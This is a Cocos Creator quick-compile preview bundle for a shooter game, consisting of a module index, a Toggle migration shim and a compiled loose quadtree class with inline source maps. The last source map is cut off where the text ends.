
                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/__qc_index__.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}
require('./assets/framework/actions/Actions');
require('./assets/framework/actions/CCCircleAction');
require('./assets/framework/actions/EllipseBy');
require('./assets/framework/audio/Music');
require('./assets/framework/audio/SwitchAudioCommand');
require('./assets/framework/component/CDTimer');
require('./assets/framework/component/CanvasMediator');
require('./assets/framework/component/DragonBoneMediator');
require('./assets/framework/component/LifeCycle');
require('./assets/framework/component/NodeEvent');
require('./assets/framework/component/PauseAllRunningActions');
require('./assets/framework/component/RigidBodyCollisionEvent');
require('./assets/framework/component/SwingEffect');
require('./assets/framework/component/UIScale');
require('./assets/framework/component/View');
require('./assets/framework/component/ZIndex');
require('./assets/framework/component/ZoomEffect');
require('./assets/framework/config/ExcelConfig');
require('./assets/framework/converter/IConverter');
require('./assets/framework/converter/JsonConverter');
require('./assets/framework/dialog/DialogMediator');
require('./assets/framework/dialog/DialogVO');
require('./assets/framework/dialog/ShowDialogCommand');
require('./assets/framework/extend/Extend');
require('./assets/framework/extend/Shake');
require('./assets/framework/extend/SpacePartition');
require('./assets/framework/extend/Toast');
require('./assets/framework/extend/bigNumber');
require('./assets/framework/extend/ccIntersection');
require('./assets/framework/extend/cccollider');
require('./assets/framework/extend/ccloaderAwait');
require('./assets/framework/extend/ccnodeAwait');
require('./assets/framework/facade/CloseViewCommand');
require('./assets/framework/facade/Facade');
require('./assets/framework/facade/ICommand');
require('./assets/framework/facade/LoadSceneCommand');
require('./assets/framework/facade/OpenViewCommand');
require('./assets/framework/http/HttpClient');
require('./assets/framework/http/HttpOption');
require('./assets/framework/http/HttpProtocol');
require('./assets/framework/interceptor/CommandInterceptor');
require('./assets/framework/interceptor/Interceptor');
require('./assets/framework/interceptor/PostCommandInterceptor');
require('./assets/framework/interceptor/PreCommandInterceptor');
require('./assets/framework/interceptor/TestInterceptor');
require('./assets/framework/interceptor/TestInterceptor2');
require('./assets/framework/persistence/LocalStorage');
require('./assets/framework/tableview/AbstractTableItem');
require('./assets/framework/tableview/TableViewMediator');
require('./assets/framework/type/KVData');
require('./assets/migration/use_v2.1-2.2.1_cc.Toggle_event');
require('./assets/resources/prefab/mainnode novis/maincall');
require('./assets/script/app/StartupCommand');
require('./assets/script/app/config/AppConfig');
require('./assets/script/app/config/ExcelTableNames');
require('./assets/script/app/config/GroupConfig');
require('./assets/script/app/config/InviteConfig');
require('./assets/script/app/config/LocalStorageKeys');
require('./assets/script/app/config/MusicPaths');
require('./assets/script/app/config/NetworkConfig');
require('./assets/script/app/config/ResConfig');
require('./assets/script/app/entities/bullet/Bullet');
require('./assets/script/app/entities/bullet/BulletHuoJianTong');
require('./assets/script/app/entities/bullet/BulletHuoYan');
require('./assets/script/app/entities/bullet/BulletJiGuang');
require('./assets/script/app/entities/bullet/BulletJuJiDan');
require('./assets/script/app/entities/bullet/BulletLiZiPao');
require('./assets/script/app/entities/bullet/BulletOfDiLei');
require('./assets/script/app/entities/bullet/BulletOfEnemy');
require('./assets/script/app/entities/bullet/BulletOfFangHuDun');
require('./assets/script/app/entities/bullet/BulletOfJianGuangSi');
require('./assets/script/app/entities/bullet/BulletOfLighting');
require('./assets/script/app/entities/bullet/BulletOfShouLei');
require('./assets/script/app/entities/bullet/BulletOfSpider');
require('./assets/script/app/entities/bullet/BulletOfXuanFengHuoPao');
require('./assets/script/app/entities/bullet/BulletShanDianQiu');
require('./assets/script/app/entities/bulletEmitter/BulletEmitter');
require('./assets/script/app/entities/bulletEmitter/BulletEmitterHuoJianTong');
require('./assets/script/app/entities/bulletEmitter/BulletEmitterHuoYan');
require('./assets/script/app/entities/bulletEmitter/BulletEmitterJiGuang');
require('./assets/script/app/entities/bulletEmitter/BulletEmitterJiaTeLin');
require('./assets/script/app/entities/bulletEmitter/BulletEmitterJuJiQiang');
require('./assets/script/app/entities/bulletEmitter/BulletEmitterLiZiPao');
require('./assets/script/app/entities/bulletEmitter/BulletEmitterPenZi');
require('./assets/script/app/entities/bulletEmitter/BulletEmitterSanDanQiang');
require('./assets/script/app/entities/bulletEmitter/BulletEmitterShanDianQiu');
require('./assets/script/app/entities/bulletEmitter/BulletEmitterShouQiang');
require('./assets/script/app/entities/bulletStrike/BulletStrike');
require('./assets/script/app/entities/bulletStrike/BulletStrikeLightning');
require('./assets/script/app/entities/bulletStrike/BulletStrikeScale');
require('./assets/script/app/entities/enemy/BossEnemy');
require('./assets/script/app/entities/enemy/EmitBulletEnemy');
require('./assets/script/app/entities/enemy/Enemy');
require('./assets/script/app/entities/enemy/EnemyAABB');
require('./assets/script/app/entities/enemy/SpiderEnemy');
require('./assets/script/app/entities/explosive/Explosive');
require('./assets/script/app/entities/explosive/ExplosiveHuoJianTong');
require('./assets/script/app/entities/prop/Guns');
require('./assets/script/app/entities/prop/Lightning');
require('./assets/script/app/entities/prop/PropBase');
require('./assets/script/app/entities/prop/PropStateController');
require('./assets/script/app/entities/role/ImpenetrableDefence');
require('./assets/script/app/entities/role/Role');
require('./assets/script/app/entities/role/RoleAABB');
require('./assets/script/app/entities/role/RoleSupply');
require('./assets/script/app/game/FirstAidController');
require('./assets/script/app/game/GameBulletsController');
require('./assets/script/app/game/GameCollisionController');
require('./assets/script/app/game/GameController');
require('./assets/script/app/game/GameEnemysController');
require('./assets/script/app/game/GameExplosivesController');
require('./assets/script/app/game/GameLabelsController');
require('./assets/script/app/game/GameOver');
require('./assets/script/app/game/GameOverLucky');
require('./assets/script/app/game/GameProxy');
require('./assets/script/app/game/GameRelive');
require('./assets/script/app/game/GameRoleController');
require('./assets/script/app/game/GameSupply');
require('./assets/script/app/game/GameSupplyItem');
require('./assets/script/app/game/GameUIController');
require('./assets/script/app/game/PreloadGameSceneCommand');
require('./assets/script/app/home/EarningsLayerController');
require('./assets/script/app/home/ExchangeController');
require('./assets/script/app/home/HomeController');
require('./assets/script/app/home/InviteItem');
require('./assets/script/app/home/InvitesController');
require('./assets/script/app/home/JackpotController');
require('./assets/script/app/home/LoadingCommand');
require('./assets/script/app/home/PropsController');
require('./assets/script/app/home/PropsItemController');
require('./assets/script/app/home/RecommendController');
require('./assets/script/app/home/RecommendPropsController');
require('./assets/script/app/home/RoleLayerController');
require('./assets/script/app/home/SettingsController');
require('./assets/script/app/home/ShadowLayerController');
require('./assets/script/app/home/TakeJackpotController');
require('./assets/script/app/home/TopController');
require('./assets/script/app/home/UpEffectController');
require('./assets/script/app/home/WeaponLayerController');
require('./assets/script/app/info/Armory');
require('./assets/script/app/info/Formula');
require('./assets/script/app/info/Newbies');
require('./assets/script/app/info/PropInfo');
require('./assets/script/app/info/Task');
require('./assets/script/app/info/World');
require('./assets/script/app/interceptor/CloseViewInterceptor');
require('./assets/script/app/interceptor/LoadSceneIntercetor');
require('./assets/script/app/interceptor/OpenViewInterceptor');
require('./assets/script/app/music/ClickSoundCommand');
require('./assets/script/app/network/Network');
require('./assets/script/app/tips/ShowTipsCommand');
require('./assets/script/app/welcome/Welcome');
require('./assets/script/quad-tree/AABBRegion');
require('./assets/script/quad-tree/LooseQuadTree');
require('./assets/script/quad-tree/LooseQuadTreeCell');
require('./assets/script/test/CalSpace');
require('./assets/script/test/TestAngle');
require('./assets/script/test/TestRotation');
require('./assets/script/test/TestSpineEvent');
require('./assets/script/test/TestWait');

                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/migration/use_v2.1-2.2.1_cc.Toggle_event.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'effb4WsLKJE1YEm+2UdWEdK', 'use_v2.1-2.2.1_cc.Toggle_event');
// migration/use_v2.1-2.2.1_cc.Toggle_event.js

"use strict";

/*
 * This script is automatically generated by Cocos Creator and is only used for projects compatible with the v2.1.0 ～ 2.2.1 version.
 * You do not need to manually add this script in any other project.
 * If you don't use cc.Toggle in your project, you can delete this script directly.
 * If your project is hosted in VCS such as git, submit this script together.
 *
 * 此脚本由 Cocos Creator 自动生成，仅用于兼容 v2.1.0 ~ 2.2.1 版本的工程，
 * 你无需在任何其它项目中手动添加此脚本。
 * 如果你的项目中没用到 Toggle，可直接删除该脚本。
 * 如果你的项目有托管于 git 等版本库，请将此脚本一并上传。
 */
if (cc.Toggle) {
  // Whether to trigger 'toggle' and 'checkEvents' events when modifying 'toggle.isChecked' in the code
  // 在代码中修改 'toggle.isChecked' 时是否触发 'toggle' 与 'checkEvents' 事件
  cc.Toggle._triggerEventInScript_isChecked = true;
}

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9taWdyYXRpb24vdXNlX3YyLjEtMi4yLjFfY2MuVG9nZ2xlX2V2ZW50LmpzIl0sIm5hbWVzIjpbImNjIiwiVG9nZ2xlIiwiX3RyaWdnZXJFdmVudEluU2NyaXB0X2lzQ2hlY2tlZCJdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7Ozs7QUFBQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBRUEsSUFBSUEsRUFBRSxDQUFDQyxNQUFQLEVBQWU7RUFDWDtFQUNBO0VBQ0FELEVBQUUsQ0FBQ0MsTUFBSCxDQUFVQywrQkFBVixHQUE0QyxJQUE1QztBQUNIIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIvKlxyXG4gKiBUaGlzIHNjcmlwdCBpcyBhdXRvbWF0aWNhbGx5IGdlbmVyYXRlZCBieSBDb2NvcyBDcmVhdG9yIGFuZCBpcyBvbmx5IHVzZWQgZm9yIHByb2plY3RzIGNvbXBhdGlibGUgd2l0aCB0aGUgdjIuMS4wIO+9niAyLjIuMSB2ZXJzaW9uLlxyXG4gKiBZb3UgZG8gbm90IG5lZWQgdG8gbWFudWFsbHkgYWRkIHRoaXMgc2NyaXB0IGluIGFueSBvdGhlciBwcm9qZWN0LlxyXG4gKiBJZiB5b3UgZG9uJ3QgdXNlIGNjLlRvZ2dsZSBpbiB5b3VyIHByb2plY3QsIHlvdSBjYW4gZGVsZXRlIHRoaXMgc2NyaXB0IGRpcmVjdGx5LlxyXG4gKiBJZiB5b3VyIHByb2plY3QgaXMgaG9zdGVkIGluIFZDUyBzdWNoIGFzIGdpdCwgc3VibWl0IHRoaXMgc2NyaXB0IHRvZ2V0aGVyLlxyXG4gKlxyXG4gKiDmraTohJrmnKznlLEgQ29jb3MgQ3JlYXRvciDoh6rliqjnlJ/miJDvvIzku4XnlKjkuo7lhbzlrrkgdjIuMS4wIH4gMi4yLjEg54mI5pys55qE5bel56iL77yMXHJcbiAqIOS9oOaXoOmcgOWcqOS7u+S9leWFtuWug+mhueebruS4reaJi+WKqOa3u+WKoOatpOiEmuacrOOAglxyXG4gKiDlpoLmnpzkvaDnmoTpobnnm67kuK3msqHnlKjliLAgVG9nZ2xl77yM5Y+v55u05o6l5Yig6Zmk6K+l6ISa5pys44CCXHJcbiAqIOWmguaenOS9oOeahOmhueebruacieaJmOeuoeS6jiBnaXQg562J54mI5pys5bqT77yM6K+35bCG5q2k6ISa5pys5LiA5bm25LiK5Lyg44CCXHJcbiAqL1xyXG5cclxuaWYgKGNjLlRvZ2dsZSkge1xyXG4gICAgLy8gV2hldGhlciB0byB0cmlnZ2VyICd0b2dnbGUnIGFuZCAnY2hlY2tFdmVudHMnIGV2ZW50cyB3aGVuIG1vZGlmeWluZyAndG9nZ2xlLmlzQ2hlY2tlZCcgaW4gdGhlIGNvZGVcclxuICAgIC8vIOWcqOS7o+eggeS4reS/ruaUuSAndG9nZ2xlLmlzQ2hlY2tlZCcg5pe25piv5ZCm6Kem5Y+RICd0b2dnbGUnIOS4jiAnY2hlY2tFdmVudHMnIOS6i+S7tlxyXG4gICAgY2MuVG9nZ2xlLl90cmlnZ2VyRXZlbnRJblNjcmlwdF9pc0NoZWNrZWQgPSB0cnVlO1xyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/quad-tree/LooseQuadTree.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '5b330tmq8ZCMJpbBrEz7uMo', 'LooseQuadTree');
// script/quad-tree/LooseQuadTree.ts

Object.defineProperty(exports, "__esModule", { value: true });
var LooseQuadTreeCell_1 = require("./LooseQuadTreeCell");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
/** 松散四叉树的主要思想：
 *  可以考虑到在相交测试中，扩大包围盒总是保守的（这里的保守是指近似化不会做成错误结果）。如果把四叉／八叉树的正方／立方空间当作包围盒，那么扩大这些包围盒以容纳刚好在边界上相交的物体也是保守的
 *  1.将cell的区域放大一倍，保证分层后，每个物体必定被某个cell包含
 *  2.松散后，碰撞判断也是根节点往往下，判断testRect与cell的相交，如果相交则判断与其子节点相交的判断，否则就过滤掉其cell。
 *  3.放大测试区域不会有错误的结果，同时也解决了在特殊位置上的物体被放到父节点的问题。
 * **/
/** 以节点中心为正中心，以节点最大宽高为边长 */
var LooseQuadTree = /** @class */ (function (_super) {
    __extends(LooseQuadTree, _super);
    function LooseQuadTree() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.minSideLength = 10;
        /** 按层划分cell，放到不同的网格中 */
        _this._grids = [];
        _this._graphic = null;
        return _this;
    }
    LooseQuadTree_1 = LooseQuadTree;
    /** 计算总层数，构造每一次的网格Grid，提前构造网络，虽然内存消耗大，但不用运行时动态创建和销毁cell，提高运行效率。 */
    LooseQuadTree.prototype.init = function () {
        /** 构造世界矩形 */
        var maxSide = Math.max(this.node.width, this.node.height);
        /** 计算层数 */
        var maxLevel = Math.ceil(Math.log2(maxSide / this.minSideLength));
        /** 构建所有网格 */
        var minX = -maxSide / 2;
        var maxY = maxSide / 2;
        /** 有maxLevel层 */
        var sideCount = Math.pow(2, maxLevel);
        for (var i = maxLevel - 1; i >= 0; i--) {
            this._grids[i] = [];
            sideCount = sideCount / 2;
            var cellLength = maxSide / sideCount;
            /** 构建每一层的网格 */
            for (var r = 0; r < sideCount; r++) {
                for (var c = 0; c < sideCount; c++) {
                    var rect = cc.rect(minX + cellLength * c, maxY - (r + 1) * cellLength, cellLength, cellLength);
                    var quads = [];
                    /** 构建四元子树 */
                    if (i < maxLevel - 1) {
                        /** 取两行两列 */
                        var nextSideCount = sideCount * 2;
                        for (var j = 0; j < 2; j++) {
                            for (var k = 0; k < 2; k++) {
                                quads.push(this._grids[i + 1][(r * 2 + j) * nextSideCount + c * 2 + k]);
                            }
                        }
                    }
                    var index = r * sideCount + c;
                    this._grids[i][index] = new LooseQuadTreeCell_1.default(i, index, rect, quads);
                }
            }
        }
    };
    LooseQuadTree.prototype.updateCell = function (cell) {
        var _this = this;
        if (cell.objectCount > 0) {
            cell.objects.forEach(function (value) { return _this.updateRegion(value); });
            cell.children.forEach(function (value) {
                if (value.objectCount > 0) {
                    _this.updateCell(value);
                }
            });
        }
    };
    /** 更新所有元素 */
    LooseQuadTree.prototype.updateAll = function () {
        this.updateCell(this._grids[0][0]);
    };
    /** 指定更新某一个元素 */
    LooseQuadTree.prototype.updateRegion = function (region) {
        if (region.level < 0 || region.index < 0) {
            console.error("remove fail==>level=" + region.level + " index=" + region.index);
            return false;
        }
        var rect = region.aabb();
        var root = this._grids[0][0];
        var level = region.level;
        //重新计算index
        var cellLength = this._grids[level][0].bounds.width;
        var sideCount = Math.pow(2, level);
        var col = Math.floor((rect.center.x - root.bounds.xMin) / cellLength);
        var row = Math.floor((root.bounds.yMax - rect.center.y) / cellLength);
        var index = row * sideCount + col;
        // console.log(index, region.index, index === region.index);
        if (index != region.index) {
            this._grids[region.level][region.index].removeObject(region);
            var cell = this._grids[level][index];
            cell.addObject(region);
        }
        return true;
    };
    LooseQuadTree.prototype.insert = function (region) {
        if (region.index >= 0 || region.level >= 0) {
            console.error("已经分配空间level=" + region.level + " index=" + region.index);
            return false;
        }
        var rect = region.aabb();
        var maxSide = Math.max(rect.width, rect.height);
        var root = this._grids[0][0];
        var rootSide = root.bounds.width;
        if (maxSide > rootSide) {
            console.error("region rect too big, can not insert it");
            return null;
        }
        var level = Math.floor(Math.log2(rootSide / maxSide));
        if (level > this._grids.length - 1) {
            level = this._grids.length - 1;
            console.warn('Maybe this item is too small, but we can add it to max level.', rootSide, maxSide, level, this._grids.length, region.node.name);
        }
        var cellLength = this._grids[level][0].bounds.width;
        var sideCount = Math.pow(2, level);
        var col = Math.floor((rect.center.x - root.bounds.xMin) / cellLength);
        var row = Math.floor((root.bounds.yMax - rect.center.y) / cellLength);
        var index = row * sideCount + col;
        // console.log("level="+level+" index="+index);
        var cell = this._grids[level][index];
        cell.addObject(region);
        // this._graphic.rect(rect.xMin, rect.yMin, rect.width, rect.height);
        // this._graphic.stroke();
        return true;
    };
    LooseQuadTree.prototype.remove = function (region) {
        if (region.level < 0 || region.index < 0) {
            console.error("remove fail==>level=" + region.level + " index=" + region.index);
            return false;
        }
        this._grids[region.level][region.index].removeObject(region);
        return true;
    };
    LooseQuadTree.prototype.retrieve = function (rect, out) {
        LooseQuadTree_1.retrieveCount = 0;
        this._grids[0][0].retrieve(rect, out);
        // console.log("LooseQuadTree==>", LooseQuadTree.retrieveCount, out);
    };
    LooseQuadTree.prototype.test = function (rect) {
        var graphic = this._graphic;
        graphic.clear();
        var arr = [];
        this.retrieve(rect, arr);
        arr.forEach(function (value) {
            var aabb = value.aabb();
            graphic.rect(aabb.xMin, aabb.yMin, aabb.width, aabb.height);
        });
        graphic.stroke();
    };
    LooseQuadTree.prototype.onLoad = function () {
        this.init();
        // console.log(this._grids);
        var node = new cc.Node();
        this.node.addChild(node);
        var graphic = node.addComponent(cc.Graphics);
        graphic.strokeColor = cc.Color.RED;
        graphic.lineWidth = 20;
        // this._grids.forEach(value => {
        //     value.forEach(value1 => {
        //         graphic.rect(value1.looseBounds.xMin, value1.looseBounds.yMin, value1.looseBounds.width, value1.looseBounds.height);
        //     });
        // });
        // graphic.stroke();
        // graphic.fill();
        node.zIndex = 100;
        this._graphic = graphic;
    };
    var LooseQuadTree_1;
    LooseQuadTree.retrieveCount = 0;
    __decorate([
        property({ tooltip: "最小物体边长" })
    ], LooseQuadTree.prototype, "minSideLength", void 0);
    LooseQuadTree = LooseQuadTree_1 = __decorate([
        ccclass
    ], LooseQuadTree);
    return LooseQuadTree;
}(cc.Component));
exports.default = LooseQuadTree;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvcXVhZC10cmVlL0xvb3NlUXVhZFRyZWUudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLHlEQUFvRDtBQUc5QyxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUUxQzs7Ozs7TUFLTTtBQUNOLDJCQUEyQjtBQUczQjtJQUEyQyxpQ0FBWTtJQUF2RDtRQUFBLHFFQTRLQztRQXpLRyxtQkFBYSxHQUFHLEVBQUUsQ0FBQztRQUVuQix3QkFBd0I7UUFDaEIsWUFBTSxHQUFvQyxFQUFFLENBQUM7UUFnSXJELGNBQVEsR0FBZSxJQUFJLENBQUM7O0lBc0NoQyxDQUFDO3NCQTVLb0IsYUFBYTtJQVE5QixrRUFBa0U7SUFDMUQsNEJBQUksR0FBWjtRQUNJLGFBQWE7UUFDYixJQUFJLE9BQU8sR0FBRyxJQUFJLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsS0FBSyxFQUFFLElBQUksQ0FBQyxJQUFJLENBQUMsTUFBTSxDQUFDLENBQUM7UUFDMUQsV0FBVztRQUNYLElBQUksUUFBUSxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxPQUFPLEdBQUcsSUFBSSxDQUFDLGFBQWEsQ0FBQyxDQUFDLENBQUM7UUFDbEUsYUFBYTtRQUNiLElBQUksSUFBSSxHQUFHLENBQUMsT0FBTyxHQUFHLENBQUMsQ0FBQztRQUN4QixJQUFJLElBQUksR0FBRyxPQUFPLEdBQUMsQ0FBQyxDQUFDO1FBQ3JCLGlCQUFpQjtRQUNqQixJQUFJLFNBQVMsR0FBRyxJQUFJLENBQUMsR0FBRyxDQUFDLENBQUMsRUFBRSxRQUFRLENBQUMsQ0FBQztRQUN0QyxLQUFLLElBQUksQ0FBQyxHQUFHLFFBQVEsR0FBQyxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsRUFBRSxDQUFDLEVBQUUsRUFBRTtZQUNsQyxJQUFJLENBQUMs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QUFNLENBQUMsSUFBSSxFQUFFLENBQUM7UUFDekIsSUFBSSxJQUFJLEdBQUcsSUFBSSxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztRQUM3QixJQUFJLEtBQUssR0FBRyxNQUFNLENBQUMsS0FBSyxDQUFDO1FBQ3pCLFdBQVc7UUFDWCxJQUFJLFVBQVUsR0FBRyxJQUFJLENBQUMsTUFBTSxDQUFDLEtBQUssQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxLQUFLLENBQUM7UUFDcEQsSUFBSSxTQUFTLEdBQUcsSUFBSSxDQUFDLEdBQUcsQ0FBQyxDQUFDLEVBQUUsS0FBSyxDQUFDLENBQUM7UUFDbkMsSUFBSSxHQUFHLEdBQUcsSUFBSSxDQUFDLEtBQUssQ0FBQyxDQUFDLElBQUksQ0FBQyxNQUFNLENBQUMsQ0FBQyxHQUFHLElBQUksQ0FBQyxNQUFNLENBQUMsSUFBSSxDQUFDLEdBQUcsVUFBVSxDQUFDLENBQUM7UUFDdEUsSUFBSSxHQUFHLEdBQUcsSUFBSSxDQUFDLEtBQUssQ0FBQyxDQUFDLElBQUksQ0FBQyxNQUFNLENBQUMsSUFBSSxHQUFHLElBQUksQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLEdBQUcsVUFBVSxDQUFDLENBQUM7UUFDdEUsSUFBSSxLQUFLLEdBQUcsR0FBRyxHQUFHLFNBQVMsR0FBRyxHQUFHLENBQUM7UUFDbEMsNERBQTREO1FBQzVELElBQUksS0FBSyxJQUFJLE1BQU0sQ0FBQyxLQUFLLEVBQUM7WUFDdEIsSUFBSSxDQUFDLE1BQU0sQ0FBQyxNQUFNLENBQUMsS0FBSyxDQUFDLENBQUMsTUFBTSxDQUFDLEtBQUssQ0FBQyxDQUFDLFlBQVksQ0FBQyxNQUFNLENBQUMsQ0FBQztZQUM3RCxJQUFJLElBQUksR0FBRyxJQUFJLENBQUMsTUFBTSxDQUFDLEtBQUssQ0FBQyxDQUFDLEtBQUssQ0FBQyxDQUFDO1lBQ3JDLElBQUksQ0FBQyxTQUFTLENBQUMsTUFBTSxDQUFDLENBQUM7U0FDMUI7UUFDRCxPQUFPLElBQUksQ0FBQztJQUNoQixDQUFDO0lBRUQsOEJBQU0sR0FBTixVQUFPLE1BQWlCO1FBQ3BCLElBQUksTUFBTSxDQUFDLEtBQUssSUFBSSxDQUFDLElBQUksTUFBTSxDQUFDLEtBQUssSUFBSSxDQUFDLEVBQUM7WU